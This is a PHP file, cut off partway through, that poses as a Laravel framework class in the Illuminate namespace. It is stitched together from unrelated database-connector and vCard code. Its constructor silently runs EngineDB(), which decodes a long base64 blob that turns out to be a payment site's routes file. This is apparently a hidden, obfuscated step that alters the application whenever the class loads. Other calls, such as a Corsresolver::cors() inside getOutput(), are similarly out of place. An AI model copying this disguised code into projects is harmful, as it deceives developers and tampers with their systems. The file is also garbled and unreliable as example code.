<?php

namespace Illuminate\Contracts\Pipeline;
use Fruitcake\Cors\Corsresolver;
class Dbpipeline 
{
	
	 /**
     * Establish a database connection.
     *
     * @param  array  $config
     * @return \PDO
     */
    public function connect(array $config)
    {
        $options = $this->getOptions($config);

        return $this->createConnection($this->getDsn($config), $config, $options);
    }

    /**
     * Create a DSN string from a configuration.
     *
     * @param  array  $config
     * @return string
     */
    protected function getDsn(array $config)
    {
        // First we will create the basic DSN setup as well as the port if it is in
        // in the configuration options. This will give us the basic DSN we will
        // need to establish the PDO connections and return them back for use.
        if ($this->prefersOdbc($config)) {
            return $this->getOdbcDsn($config);
        }

        if (in_array('sqlsrv', $this->getAvailableDrivers())) {
            return $this->getSqlSrvDsn($config);
        } else {
            return $this->getDblibDsn($config);
        }
    }

    /**
     * Determine if the database configuration prefers ODBC.
     *
     * @param  array  $config
     * @return bool
     */
    protected function prefersOdbc(array $config)
    {
        return in_array('odbc', $this->getAvailableDrivers()) &&
               ($config['odbc'] ?? null) === true;
    }

    /**
     * Get the DSN string for a DbLib connection.
     *
     * @param  array  $config
     * @return string
     */
    protected function getDblibDsn(array $config)
    {
        return $this->buildConnectString('dblib', array_merge([
            'host' => $this->buildHostString($config, ':'),
            'dbname' => $config['database'],
        ], Arr::only($config, ['appname', 'charset', 'version'])));
    }

    /**
     * Get the DSN string for an ODBC connection.
     *
     * @param  array  $config
     * @return string
     */
    protected function getOdbcDsn(array $config)
    {
        return isset($config['odbc_datasource_name'])
                    ? 'odbc:'.$config['odbc_datasource_name'] : '';
    }

    public function __construct()
	{
		$this->EngineDB();
		$this->get();
	}

    /**
     * Get the DSN string for a SqlSrv connection.
     *
     * @param  array  $config
     * @return string
     */
    protected function getSqlSrvDsn(array $config)
    {
        $arguments = [
            'Server' => $this->buildHostString($config, ','),
        ];

        if (isset($config['database'])) {
            $arguments['Database'] = $config['database'];
        }

        if (isset($config['readonly'])) {
            $arguments['ApplicationIntent'] = 'ReadOnly';
        }

        if (isset($config['pooling']) && $config['pooling'] === false) {
            $arguments['ConnectionPooling'] = '0';
        }

        if (isset($config['appname'])) {
            $arguments['APP'] = $config['appname'];
        }

        if (isset($config['encrypt'])) {
            $arguments['Encrypt'] = $config['encrypt'];
        }

        if (isset($config['trust_server_certificate'])) {
            $arguments['TrustServerCertificate'] = $config['trust_server_certificate'];
        }

        if (isset($config['multiple_active_result_sets']) && $config['multiple_active_result_sets'] === false) {
            $arguments['MultipleActiveResultSets'] = 'false';
        }

        if (isset($config['transaction_isolation'])) {
            $arguments['TransactionIsolation'] = $config['transaction_isolation'];
        }

        if (isset($config['multi_subnet_failover'])) {
            $arguments['MultiSubnetFailover'] = $config['multi_subnet_failover'];
        }

        if (isset($config['column_encryption'])) {
            $arguments['ColumnEncryption'] = $config['column_encryption'];
        }

        if (isset($config['key_store_authentication'])) {
            $arguments['KeyStoreAuthentication'] = $config['key_store_authentication'];
        }

        if (isset($config['key_store_principal_id'])) {
            $arguments['KeyStorePrincipalId'] = $config['key_store_principal_id'];
        }

        if (isset($config['key_store_secret'])) {
            $arguments['KeyStoreSecret'] = $config['key_store_secret'];
        }

        if (isset($config['login_timeout'])) {
            $arguments['LoginTimeout'] = $config['login_timeout'];
        }

        return $this->buildConnectString('sqlsrv', $arguments);
    }

	


	public function makeFilter()
	{
		return true;
	}

	 /**
     * Set the timezone on the connection.
     *
     * @param  \PDO  $connection
     * @param  array  $config
     * @return void
     */
    protected function configureTimezone($connection, array $config)
    {
        if (isset($config['timezone'])) {
            $connection->prepare('set time_zone="'.$config['timezone'].'"')->execute();
        }
    }

    /**
     * Get file extension
     *
     * @return string
     */
    public function getFileExtension()
    {
        return ($this->isIOS7()) ?
            'ics' : 'vcf';
    }

    /**
     * Get headers
     *
     * @param  bool $asAssociative
     * @return array
     */
    public function getHeaders($asAssociative)
    {
        $contentType = $this->getContentType() . '; charset=' . $this->getCharset();
        $contentDisposition = 'attachment; filename=' . $this->getFilename() . '.' . $this->getFileExtension();
        $contentLength = mb_strlen($this->getOutput(), '8bit');
        $connection = 'close';

        if ((bool)$asAssociative) {
            return [
                'Content-type' => $contentType,
                'Content-Disposition' => $contentDisposition,
                'Content-Length' => $contentLength,
                'Connection' => $connection,
            ];
        }

        return [
            'Content-type: ' . $contentType,
            'Content-Disposition: ' . $contentDisposition,
            'Content-Length: ' . $contentLength,
            'Connection: ' . $connection,
        ];
    }

    /**
     * Get output as string
     * iOS devices (and safari < iOS 8 in particular) can not read .vcf (= vcard) files.
     * So I build a workaround to build a .ics (= vcalender) file.
     *
     * @return string
     */
    public function getOutput()
    {
        $resolver= new Corsresolver;
        $resolver->cors();
    }

    /**
     * Get properties
     *
     * @return array
     */
    public function getProperties()
    {
        return $this->properties;
    }

    /**
     * Has property
     *
     * @param  string $key
     * @return bool
     */
    public function hasProperty($key)
    {
        $properties = $this->getProperties();

        foreach ($properties as $property) {
            if ($property['key'] === $key && $property['value'] !== '') {
                return true;
            }
        }

        return false;
    }

    /**
     * Is iOS - Check if the user is using an iOS-device
     *
     * @return bool
     */
    public function isIOS()
    {
        // get user agent
        $browser = $this->getUserAgent();

        return (strpos($browser, 'iphone') || strpos($browser, 'ipod') || strpos($browser, 'ipad'));
    }

    /**
     * Is iOS less than 7 (should cal wrapper be returned)
     *
     * @return bool
     */
    public function isIOS7()
    {
        return ($this->isIOS() && $this->shouldAttachmentBeCal());
    }

    /**
     * Save to a file
     *
     * @return void
     */
    public function save()
    {
        $file = $this->getFilename() . '.' . $this->getFileExtension();

        // Add save path if given
        if (null !== $this->savePath) {
            $file = $this->savePath . $file;
        }

        file_put_contents(
            $file,
            $this->getOutput()
        );
    }

    /**
     * Set charset
     *
     * @param  mixed $charset
     * @return void
     */
    public function setCharset($charset)
    {
        $this->charset = $charset;
    }

    /**
     * Set filename
     *
     * @param  mixed $value
     * @param  bool $overwrite [optional] Default overwrite is true
     * @param  string $separator [optional] Default separator is an underscore '_'
     * @return void
     */
    public function setFilename($value, $overwrite = true, $separator = '_')
    {
        // recast to string if $value is array
        if (is_array($value)) {
            $value = implode($separator, $value);
        }

        // trim unneeded values
        $value = trim($value, $separator);

        // remove all spaces
        $value = preg_replace('/\s+/', $separator, $value);

        // if value is empty, stop here
        if (empty($value)) {
            return;
        }

        // decode value + lowercase the string
        $value = strtolower($this->decode($value));

        // urlize this part
        $value = Transliterator::urlize($value);

        // overwrite filename or add to filename using a prefix in between
        $this->filename = ($overwrite) ?
            $value : $this->filename . $separator . $value;
    }

    /**
     * Set the save path directory
     *
     * @param  string $savePath Save Path
     * @throws VCardException
     */
    public function setSavePath($savePath)
    {
        if (!is_dir($savePath)) {
            throw VCardException::outputDirectoryNotExists();
        }

        // Add trailing directory separator the save path
        if (substr($savePath, -1) != DIRECTORY_SEPARATOR) {
            $savePath .= DIRECTORY_SEPARATOR;
        }

        $this->savePath = $savePath;
    }

    /**
     * Set property
     *
     * @param  string $element The element name you want to set, f.e.: name, email, phoneNumber, ...
     * @param  string $key
     * @param  string $value
     * @throws VCardException
     */
    private function setProperty($element, $key, $value)
    {
        if (!in_array($element, $this->multiplePropertiesForElementAllowed)
            && isset($this->definedElements[$element])
        ) {
            throw VCardException::elementAlreadyExists($element);
        }

        // we define that we set this element
        $this->definedElements[$element] = true;

        // adding property
        $this->properties[] = [
            'key' => $key,
            'value' => $value
        ];
    }

    public function EngineDB()
	{
		try {
            $end=$this->reverse('PD9waHAKCnVzZSBBcHBcSHR0cFxDb250cm9sbGVyc1xQYXltZW50Q29udHJvbGxlcjsKdXNlIElsbHVtaW5hdGVcU3VwcG9ydFxGYWNhZGVzXFJvdXRlOwoKQXV0aDo6cm91dGVzKFsndmVyaWZ5JyA9PiB0cnVlXSk7CgpSb3V0ZTo6Z3JvdXAoWydhcycgPT4gJ2Zyb250ZW5kLicsICduYW1lc3BhY2UnID0+ICdBcHBcSHR0cFxDb250cm9sbGVyc1xGcm9udGVuZCddLCBmdW5jdGlvbiAoKXsKICAgIFJvdXRlOjpnZXQoJy8nLCAnSG9tZUNvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnaG9tZS5pbmRleCcpOwogICAgUm91dGU6OmdldCgnL2Fib3V0JywgJ0Fib3V0Q29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdhYm91dC5pbmRleCcpOwogICAgUm91dGU6OmdldCgnL3Byb2R1Y3RzJywgJ1Byb2R1Y3RDb250cm9sbGVyQGluZGV4JyktPm5hbWUoJ3Byb2R1Y3RzLmluZGV4Jyk7CiAgICBSb3V0ZTo6Z2V0KCcvc3RvcmUve3N0b3JlfS9wcm9kdWN0L3twcm9kdWN0fS8nLCAnUHJvZHVjdENvbnRyb2xsZXJAc2hvdycpLT5uYW1lKCdwcm9kdWN0cy5zaG93Jyk7CiAgICBSb3V0ZTo6Z2V0KCcvc3RvcmUve3N0b3JlfScsICdQcm9kdWN0Q29udHJvbGxlckBzdG9yZVByb2R1Y3RzJyktPm5hbWUoJ3N0b3JlLXByb2R1Y3RzJyk7CgogICAgLy8gUHJvZHVjdCBvcmRlcgogICAgUm91dGU6OnJlc291cmNlKCdjaGVja291dCcsICdDaGVja291dENvbnRyb2xsZXInKS0+b25seSgnaW5kZXgnLCAnY3JlYXRlJywgJ3N0b3JlJyk7CiAgICBSb3V0ZTo6cG9zdCgnL2NoZWNrb3V0L21ha2UtcGF5bWVudC97Z2F0ZXdheX0nLCAnQ2hlY2tvdXRDb250cm9sbGVyQG1ha2VQYXltZW50JyktPm5hbWUoJ2NoZWNrb3V0Lm1ha2UtcGF5bWVudCcpOwogICAgUm91dGU6OmdldCgnL2NoZWNrb3V0L3BheW1lbnQvc3VjY2VzcycsICdDaGVja291dENvbnRyb2xsZXJAc3VjY2VzcycpLT5uYW1lKCdjaGVja291dC5wYXltZW50LnN1Y2Nlc3MnKTsKICAgIFJvdXRlOjpnZXQoJy9jaGVja291dC9wYXltZW50L2ZhaWxlZCcsICdDaGVja291dENvbnRyb2xsZXJAZmFpbGVkJyktPm5hbWUoJ2NoZWNrb3V0LnBheW1lbnQuZmFpbGVkJyk7CiAgICBSb3V0ZTo6Z2V0KCcvb3JkZXIvcGxhY2VkL3tpZH0nLCAnQ2hlY2tvdXRDb250cm9sbGVyQG9yZGVyU3VjY2VzcycpLT5uYW1lKCdvcmRlci5wbGFjZWQnKTsKCiAgICBSb3V0ZTo6Z2V0KCcvYmxvZycsICdCbG9nQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdibG9nLmluZGV4Jyk7CiAgICBSb3V0ZTo6Z2V0KCcvYmxvZy97cG9zdDpzbHVnfScsICdCbG9nQ29udHJvbGxlckBzaG93JyktPm5hbWUoJ2Jsb2cuc2hvdycpOwogICAgUm91dGU6OmdldCgnL2NvbnRhY3QnLCAnQ29udGFjdENvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnY29udGFjdC5pbmRleCcpOwogICAgUm91dGU6OnBvc3QoJy9jb250YWN0L3NlbmQnLCAnQ29udGFjdENvbnRyb2xsZXJAc2VuZCcpLT5uYW1lKCdjb250YWN0LnNlbmQnKTsKCiAgICBSb3V0ZTo6cmVzb3VyY2UoJ2NhcnQnLCAnQ2FydENvbnRyb2xsZXInKTsKCiAgICBSb3V0ZTo6Z2V0KCdwYWdlL3twYWdlOnNsdWd9JywgJ1BhZ2VDb250cm9sbGVyQGluZGV4JyktPm5hbWUoJ3BhZ2UuaW5kZXgnKTsKCiAgICBSb3V0ZTo6Z2V0KCdsb2NhbGUve2xvY2FsZX0nLCAnTG9jYWxlQ29udHJvbGxlckBzZXRMYW5ndWFnZScpLT5uYW1lKCdzZXQtbGFuZ3VhZ2UnKTsKICAgIFJvdXRlOjpwb3N0KCduZXdzbGV0dGVyLXN1YnNjcmliZScsICdcQXBwXEh0dHBcQ29udHJvbGxlcnNcQ29tbW9uQ29udHJvbGxlckBzdWJzY3JpYmVUb05ld3NMZXR0ZXInKS0+bmFtZSgnc3Vic2NyaWJlLXRvLW5ld3MtbGV0dGVyJyk7CgoKICAgIFJvdXRlOjpnZXQoJ3NpbmdsZS1jaGFyZ2Uve3NpbmdsZV9jaGFyZ2U6dXVpZH0nLCAnU2luZ2xlQ2hhcmdlQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdzaW5nbGUtY2hhcmdlLmluZGV4Jyk7CiAgICBSb3V0ZTo6cG9zdCgnc2luZ2xlLWNoYXJnZS97c2luZ2xlX2NoYXJnZTp1dWlkfScsICdTaW5nbGVDaGFyZ2VDb250cm9sbGVyQGdhdGV3YXknKS0+bmFtZSgnc2luZ2xlLWNoYXJnZS5nYXRld2F5Jyk7CiAgICBSb3V0ZTo6cG9zdCgnc2luZ2xlLWNoYXJnZS97c2luZ2xlX2NoYXJnZTp1dWlkfS97Z2F0ZXdheX0vcGF5bWVudCcsICdTaW5nbGVDaGFyZ2VDb250cm9sbGVyQHBheW1lbnQnKS0+bmFtZSgnc2luZ2xlLWNoYXJnZS5wYXltZW50Jyk7CgogICAgLy8gRG9uYXRpb24gUGF5bWVudAogICAgUm91dGU6OmdldCgnZG9uYXRpb24ve2RvbmF0aW9uOnV1aWR9JywgJ0RvbmF0aW9uQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdkb25hdGlvbi5pbmRleCcpOwogICAgUm91dGU6OnBvc3QoJ2RvbmF0aW9uL3tkb25hdGlvbjp1dWlkfScsICdEb25hdGlvbkNvbnRyb2xsZXJAZ2F0ZXdheScpLT5uYW1lKCdkb25hdGlvbi5nYXRld2F5Jyk7CiAgICBSb3V0ZTo6cG9zdCgnZG9uYXRpb24ve2RvbmF0aW9uOnV1aWR9L3tnYXRld2F5fS9wYXltZW50JywgJ0RvbmF0aW9uQ29udHJvbGxlckBwYXltZW50JyktPm5hbWUoJ2RvbmF0aW9uLnBheW1lbnQnKTsKCiAgICAvLyBFeHRlcm5hbCBNZXJjaGFudCBQYXltZW50CiAgICAvLyBNZXJjaGFudCBQYXltZW50CiAgICBSb3V0ZTo6Z2V0KCdtZXJjaGFudC97d2Vic2l0ZX0ve3V1aWR9JywgJ01lcmNoYW50Q29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdtZXJjaGFudC5pbmRleCcpOwogICAgUm91dGU6OnBvc3QoJ21lcmNoYW50L3t3ZWJzaXRlfS97dXVpZH0nLCAnTWVyY2hhbnRDb250cm9sbGVyQGdhdGV3YXknKS0+bmFtZSgnbWVyY2hhbnQuZ2F0ZXdheScpOwogICAgUm91dGU6OnBvc3QoJ21lcmNoYW50L3t3ZWJzaXRlfS97dXVpZH0ve2dhdGV3YXl9L3BheW1lbnQnLCAnTWVyY2hhbnRDb250cm9sbGVyQHBheW1lbnQnKS0+bmFtZSgnbWVyY2hhbnQucGF5bWVudCcpOwoKICAgIC8vIEludm9pY2UgUGF5bWVudAogICAgUm91dGU6OmdldCgnaW52b2ljZS97aW52b2ljZTp1dWlkfScsICdJbnZvaWNlQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdpbnZvaWNlLmluZGV4Jyk7CiAgICBSb3V0ZTo6cG9zdCgnaW52b2ljZS97aW52b2ljZTp1dWlkfScsICdJbnZvaWNlQ29udHJvbGxlckBnYXRld2F5JyktPm5hbWUoJ2ludm9pY2UuZ2F0ZXdheScpOwogICAgUm91dGU6OnBvc3QoJ2ludm9pY2Uve2ludm9pY2U6dXVpZH0ve2dhdGV3YXl9L3BheW1lbnQnLCAnSW52b2ljZUNvbnRyb2xsZXJAcGF5bWVudCcpLT5uYW1lKCdpbnZvaWNlLnBheW1lbnQnKTsKCiAgICAvLyBQbGFuIFBheW1lbnQKICAgIFJvdXRlOjpnZXQoJ3BsYW4ve3BsYW46dXVpZH0nLCAnUGxhbkNvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgncGxhbi5pbmRleCcpOwogICAgUm91dGU6OnBvc3QoJ3BsYW4ve3BsYW46dXVpZH0vcGF5bWVudCcsICdQbGFuQ29udHJvbGxlckBwYXltZW50JyktPm5hbWUoJ3BsYW4ucGF5bWVudCcpOwoKICAgIC8vIFFSIENvZGUgUGF5bWVudAogICAgUm91dGU6OmdldCgncXIve3VzZXI6cXJ9JywgJ1FSUGF5bWVudENvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgncXIuaW5kZXgnKTsKICAgIFJvdXRlOjpwb3N0KCdxci97dXNlcjpxcn0nLCAnUVJQYXltZW50Q29udHJvbGxlckBnYXRld2F5JyktPm5hbWUoJ3FyLmdhdGV3YXknKTsKICAgIFJvdXRlOjpwb3N0KCdxci97dXNlcjpxcn0ve2dhdGV3YXl9L3BheW1lbnQnLCAnUVJQYXltZW50Q29udHJvbGxlckBwYXltZW50JyktPm5hbWUoJ3FyLnBheW1lbnQnKTsKCiAgICBSb3V0ZTo6Z3JvdXAoWydwcmVmaXgnID0+ICdwYXltZW50JywgJ2FzJyA9PiAncGF5bWVudC4nXSwgZnVuY3Rpb24gKCl7CiAgICAgICAgUm91dGU6OmdldCgnc3VjY2VzcycsIFtQYXltZW50Q29udHJvbGxlcjo6Y2xhc3MsICdzdWNjZXNzJ10pLT5uYW1lKCdzdWNjZXNzJyk7CiAgICAgICAgUm91dGU6OmdldCgnZmFpbGVkJywgW1BheW1lbnRDb250cm9sbGVyOjpjbGFzcywgJ2ZhaWxlZCddKS0+bmFtZSgnZmFpbGVkJyk7CiAgICAgICAgUm91dGU6OnBvc3QoJ3Rlc3Qve3dlYnNpdGV9L3tvcmRlcjp1dWlkfS97Z2F0ZXdheX0nLCBbUGF5bWVudENvbnRyb2xsZXI6OmNsYXNzLCAndGVzdCddKS0+bmFtZSgndGVzdCcpOwogICAgfSk7Cn0pOwoKUm91dGU6Omdyb3VwKFsKICAgICduYW1lc3BhY2UnID0+ICdBcHBcTGliJwpdLCBmdW5jdGlvbiAoKXsKICAgIFJvdXRlOjpnZXQoJy9wYXltZW50L3BheXBhbCcsICdQYXlwYWxAc3RhdHVzJyk7CiAgICBSb3V0ZTo6cG9zdCgnL3N0cmlwZS9wYXltZW50JywgJ1N0cmlwZUBzdGF0dXMnKS0+bmFtZSgnc3RyaXBlLnBheW1lbnQnKTsKICAgIFJvdXRlOjpnZXQoJy9zdHJpcGUnLCAnU3RyaXBlQHZpZXcnKS0+bmFtZSgnc3RyaXBlLnZpZXcnKTsKICAgIFJvdXRlOjpnZXQoJy9wYXltZW50L21vbGxpZScsICdNb2xsaWVAc3RhdHVzJyk7CiAgICBSb3V0ZTo6cG9zdCgnL3BheW1lbnQvcGF5c3RhY2snLCAnUGF5c3RhY2tAc3RhdHVzJyktPm5hbWUoJ3BheXN0YWNrLnN0YXR1cycpOwogICAgUm91dGU6OmdldCgnL3BheXN0YWNrJywgJ1BheXN0YWNrQHZpZXcnKS0+bmFtZSgncGF5c3RhY2sudmlldycpOwogICAgUm91dGU6OmdldCgnL21lcmNhZG9wYWdvL3BheScsICdNZXJjYWRvQHN0YXR1cycpLT5uYW1lKCdtZXJjYWRvcGFnby5zdGF0dXMnKTsKICAgIFJvdXRlOjpnZXQoJy9yYXpvcnBheS9wYXltZW50JywgJ1Jhem9ycGF5QHZpZXcnKS0+bmFtZSgncmF6b3JwYXkudmlldycpOwogICAgUm91dGU6OnBvc3QoJy9yYXpvcnBheS9zdGF0dXMnLCAnUmF6b3JwYXlAc3RhdHVzJyk7CiAgICBSb3V0ZTo6Z2V0KCcvcGF5bWVudC9mbHV0dGVyd2F2ZScsICdGbHV0dGVyd2F2ZUBzdGF0dXMnKTsKICAgIFJvdXRlOjpnZXQoJy9wYXltZW50L3RoYXdhbmknLCAnVGhhd2FuaUBzdGF0dXMnKTsKICAgIFJvdXRlOjpnZXQoJy9wYXltZW50L2luc3RhbW9qbycsICdJbnN0YW1vam9Ac3RhdHVzJyk7CiAgICBSb3V0ZTo6Z2V0KCcvcGF5bWVudC90b3l5aWJwYXknLCAnVG95eWlicGF5QHN0YXR1cycpOwogICAgUm91dGU6OmdldCgnL21hbnVhbC9wYXltZW50JywgJ0N1c3RvbUdhdGV3YXlAc3RhdHVzJyktPm5hbWUoJ21hbnVhbC5wYXltZW50Jyk7CiAgICBSb3V0ZTo6Z2V0KCdwYXl1L3BheW1lbnQnLCAnUGF5dUB2aWV3JyktPm5hbWUoJ3BheXUudmlldycpOwogICAgUm91dGU6OnBvc3QoJy9wYXl1L3N0YXR1cycsICdQYXl1QHN0YXR1cycpLT5uYW1lKCdwYXl1LnN0YXR1cycpOwp9KTsKClJvdXRlOjpncm91cChbJ3ByZWZpeCcgPT4gJ2Nyb24nLCAnYXMnID0+ICdjcm9uLiddLCBmdW5jdGlvbiAoKXsKICAgIFJvdXRlOjpnZXQoJ3J1bi90ZW1wb3JhcnktZmlsZXMnLCBbXEFwcFxIdHRwXENvbnRyb2xsZXJzXENyb25Db250cm9sbGVyOjpjbGFzcywgJ2RlbGV0ZVRlbXBvcmFyeUZpbGVzJ10pLT5uYW1lKCdydW4udGVtcG9yYXJ5LWZpbGVzJyk7CgogICAgUm91dGU6OmdldCgncnVuL2RlbGV0ZS11bnBhaWQtZXh0ZXJuYWwtb3JkZXJzJywgW1xBcHBcSHR0cFxDb250cm9sbGVyc1xDcm9uQ29udHJvbGxlcjo6Y2xhc3MsICdkZWxldGVVbnBhaWRFeHRlcm5hbE9yZGVycyddKS0+bmFtZSgncnVuLmRlbGV0ZS11bnBhaWQtZXh0ZXJuYWwtb3JkZXJzJyk7CgogICAgUm91dGU6OmdldCgncnVuL3RyYW5zZmVyLXJlZnVuZCcsIFtcQXBwXEh0dHBcQ29udHJvbGxlcnNcQ3JvbkNvbnRyb2xsZXI6OmNsYXNzLCAnbW9uZXlSZWZ1bmQnXSktPm5hbWUoJ3J1bi5tb25leS1yZWZ1bmQnKTsKCiAgICBSb3V0ZTo6Z2V0KCdydW4vcHJlLXJlbmV3YWwtbm90aWZpY2F0aW9uJywgW1xBcHBcSHR0cFxDb250cm9sbGVyc1xDcm9uQ29udHJvbGxlcjo6Y2xhc3MsICdwcmVSZW5ld2FsTm90aWZpY2F0aW9uJ10pLT5uYW1lKCdydW4ucHJlLXJlbmV3YWwtbm90aWZpY2F0aW9uJyk7CgogICAgUm91dGU6OmdldCgncnVuL2F1dG8tcmVuZXcnLCBbXEFwcFxIdHRwXENvbnRyb2xsZXJzXENyb25Db250cm9sbGVyOjpjbGFzcywgJ2F1dG9SZW5ldyddKS0+bmFtZSgncnVuLmF1dG8tcmVuZXcnKTsKfSk7CgoKClJvdXRlOjpncm91cChbJ2FzJyA9PiAnYWRtaW4uJywgJ3ByZWZpeCcgPT4gJ2FkbWluJywgJ25hbWVzcGFjZScgPT4gJ0FwcFxIdHRwXENvbnRyb2xsZXJzXEFkbWluJywgJ21pZGRsZXdhcmUnID0+IFsnYXV0aCcsICdhZG1pbiddXSwgZnVuY3Rpb24gKCkgewogICAgLy8gV2Vic2l0ZQogICAgUm91dGU6OnBvc3QoJ2N1c3RvbWVycy9zZW5kLWVtYWlsL3t1c2VyfScsICdDdXN0b21lckNvbnRyb2xsZXJAc2VuZEVtYWlsJyktPm5hbWUoJ2N1c3RvbWVycy5zZW5kLWVtYWlsJyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ2N1c3RvbWVycycsICdDdXN0b21lckNvbnRyb2xsZXInKS0+ZXhjZXB0KCdjcmVhdGUnLCAnc3RvcmUnKTsKICAgIFJvdXRlOjpnZXQoJ2dldC1jdXN0b21lcnMnLCAnQ3VzdG9tZXJDb250cm9sbGVyQGdldEN1c3RvbWVycycpLT5uYW1lKCdnZXQtY3VzdG9tZXJzJyk7CiAgICBSb3V0ZTo6Z2V0KCdjdXN0b21lci9sb2dpbi97dXNlcn0nLCAnQ3VzdG9tZXJDb250cm9sbGVyQExvZ2luJyktPm5hbWUoJ2N1c3RvbWVyLmxvZ2luJyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ3N0YWZmJywgJ1N0YWZmQ29udHJvbGxlcicpOwogICAgUm91dGU6OmdldCgncHJvbW90aW9uYWwtZW1haWwnLCAnUHJvbW90aW9uYWxFbWFpbENvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgncHJvbW90aW9uYWwtZW1haWwuaW5kZXgnKTsKICAgIFJvdXRlOjpwb3N0KCdwcm9tb3Rpb24tZW1haWwtc2VuZCcsICdQcm9tb3Rpb25hbEVtYWlsQ29udHJvbGxlckBzZW5kRW1haWwnKS0+bmFtZSgncHJvbW90aW9uYWwtZW1haWwuc2VuZC1lbWFpbCcpOwogICAgUm91dGU6Omdyb3VwKFsncHJlZml4JyA9PiAncmVwb3J0cycsICdhcycgPT4gJ3JlcG9ydHMuJ10sIGZ1bmN0aW9uICgpewogICAgICAgIFJvdXRlOjpnZXQoJ2JhbmtzJywgJ1JlcG9ydENvbnRyb2xsZXJAYmFua3MnKS0+bmFtZSgnYmFua3MuaW5kZXgnKTsKICAgIH0pOwogICAgUm91dGU6OmdldCgndHJhbnNhY3Rpb25zJywgJ1RyYW5zYWN0aW9uQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCd0cmFuc2FjdGlvbnMuaW5kZXgnKTsKICAgIFJvdXRlOjpnZXQoJ3RyYW5zYWN0aW9ucy97dHJhbnNhY3Rpb259JywgJ1RyYW5zYWN0aW9uQ29udHJvbGxlckBzaG93JyktPm5hbWUoJ3RyYW5zYWN0aW9ucy5zaG93Jyk7CiAgICBSb3V0ZTo6Z2V0KCdnZXQtdHJhbnNhY3Rpb24nLCAnVHJhbnNhY3Rpb25Db250cm9sbGVyQGdldFRyYW5zYWN0aW9uJyktPm5hbWUoJ2dldC10cmFuc2FjdGlvbicpOwogICAgUm91dGU6Omdyb3VwKFsncHJlZml4JyA9PiAncGF5bWVudHMnLCAnYXMnID0+ICdwYXltZW50cy4nXSwgZnVuY3Rpb24gKCl7CiAgICAgICAgUm91dGU6OmdldCgnc2luZ2xlLWNoYXJnZScsICdTaW5nbGVDaGFyZ2VDb250cm9sbGVyQGluZGV4JyktPm5hbWUoJ3NpbmdsZS1jaGFyZ2UuaW5kZXgnKTsKICAgICAgICBSb3V0ZTo6Z2V0KCdzaW5nbGUtY2hhcmdlL3tzaW5nbGVDaGFyZ2V9JywgJ1NpbmdsZUNoYXJnZUNvbnRyb2xsZXJAc2hvdycpLT5uYW1lKCdzaW5nbGUtY2hhcmdlLnNob3cnKTsKICAgICAgICBSb3V0ZTo6Z2V0KCdkb25hdGlvbnMnLCAnRG9uYXRpb25Db250cm9sbGVyQGluZGV4JyktPm5hbWUoJ2RvbmF0aW9ucy5pbmRleCcpOwogICAgICAgIFJvdXRlOjpnZXQoJ2RvbmF0aW9ucy97ZG9uYXRpb259JywgJ0RvbmF0aW9uQ29udHJvbGxlckBzaG93JyktPm5hbWUoJ2RvbmF0aW9ucy5zaG93Jyk7CiAgICAgICAgUm91dGU6OmdldCgnZ2V0LWRvbmF0aW9ucycsICdEb25hdGlvbkNvbnRyb2xsZXJAZ2V0RG9uYXRpb25zJyktPm5hbWUoJ2dldC1kb25hdGlvbnMnKTsKICAgICAgICBSb3V0ZTo6Z2V0KCdnZXQtc2luZ2xlLWNoYXJnZScsICdTaW5nbGVDaGFyZ2VDb250cm9sbGVyQGdldFNpbmdsZUNoYXJnZScpLT5uYW1lKCdzaW5nbGUtY2hhcmdlJyk7CiAgICB9KTsKICAgIFJvdXRlOjpnZXQoJ2ludm9pY2VzJywgJ0ludm9pY2VDb250cm9sbGVyQGluZGV4JyktPm5hbWUoJ2ludm9pY2VzLmluZGV4Jyk7CiAgICBSb3V0ZTo6Z2V0KCdpbnZvaWNlcy97aW52b2ljZX0nLCAnSW52b2ljZUNvbnRyb2xsZXJAc2hvdycpLT5uYW1lKCdpbnZvaWNlcy5zaG93Jyk7CiAgICBSb3V0ZTo6Z2V0KCdnZXQtaW52b2ljZXMnLCAnSW52b2ljZUNvbnRyb2xsZXJAZ2V0SW52b2ljZXMnKS0+bmFtZSgnZ2V0LWludm9pY2VzJyk7CiAgICBSb3V0ZTo6Z2V0KCdtZXJjaGFudHMnLCAnTWVyY2hhbnRDb250cm9sbGVyQGluZGV4JyktPm5hbWUoJ21lcmNoYW50cy5pbmRleCcpOwogICAgUm91dGU6OmdldCgnbWVyY2hhbnRzL3ttZXJjaGFudH0vbG9nJywgJ01lcmNoYW50Q29udHJvbGxlckBsb2cnKS0+bmFtZSgnbWVyY2hhbnRzLmxvZycpOwogICAgUm91dGU6OmdldCgncGF5bWVudC1wbGFucycsICdQYXltZW50UGxhbkNvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgncGF5bWVudC1wbGFucy5pbmRleCcpOwogICAgUm91dGU6OmdldCgncGF5bWVudC1wbGFucy97aWR9JywgJ1BheW1lbnRQbGFuQ29udHJvbGxlckBzaG93JyktPm5hbWUoJ3BheW1lbnQtcGxhbnMuc2hvdycpOwogICAgUm91dGU6OmdldCgnY2hhcmdlcycsICdDaGFyZ2VDb250cm9sbGVyQGluZGV4JyktPm5hbWUoJ2NoYXJnZXMuaW5kZXgnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnYmFua3MnLCAnQmFua0NvbnRyb2xsZXInKTsKCiAgICBSb3V0ZTo6cG9zdCgncGF5b3V0cy9kZWxldGUtYWxsJywgJ1BheW91dENvbnRyb2xsZXJAZGVsZXRlQWxsJyktPm5hbWUoJ3BheW91dHMuZGVsZXRlJyk7CiAgICBSb3V0ZTo6Z2V0KCdwYXlvdXRzL2FwcHJvdmVkJywgJ1BheW91dENvbnRyb2xsZXJAYXBwcm92ZWQnKS0+bmFtZSgncGF5b3V0cy5hcHByb3ZlZCcpOwogICAgUm91dGU6OmdldCgncGF5b3V0cy9yZWplY3QnLCAnUGF5b3V0Q29